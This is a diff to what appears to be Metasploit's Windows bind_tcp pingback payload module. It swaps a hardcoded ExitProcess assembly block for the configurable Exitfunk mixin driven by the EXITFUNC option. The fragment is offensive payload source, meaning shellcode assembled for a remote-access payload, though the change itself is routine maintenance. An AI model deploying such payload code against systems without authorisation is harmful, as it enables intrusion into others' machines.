@@ -7,6 +7,7 @@ require 'msf/core/payload/pingback'
 require 'msf/core/handler/bind_tcp'
 require 'msf/core/payload/windows/block_api'
 require 'msf/base/sessions/pingback'
+require 'msf/core/payload/windows/exitfunk'
 
 module MetasploitModule
 
@@ -17,6 +18,8 @@ module MetasploitModule
   include Msf::Payload::Pingback
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Pingback::Options
+  include Msf::Payload::Windows::Exitfunk
+
 
   def initialize(info = {})
     super(merge_info(info,
@@ -36,6 +39,7 @@ module MetasploitModule
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       self.pingback_uuid ||= self.generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
+      conf = {exitfunk:   datastore['EXITFUNC']}
       addr_fam      = 2
       sockaddr_size = 16
 
@@ -134,12 +138,10 @@ module MetasploitModule
           call ebp                ; closesocket(socket)
 
         failure:
-        exitfunk:
-          mov ebx, 0x56a2b5f0
-          push.i8 0              ; push the exit function parameter
-          push ebx               ; push the hash of the exit function
-          call ebp               ; ExitProcess(0)
       ^
+      if conf[:exitfunk]
+        asm << asm_exitfunk(conf)
+      end
       Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
     end
   end
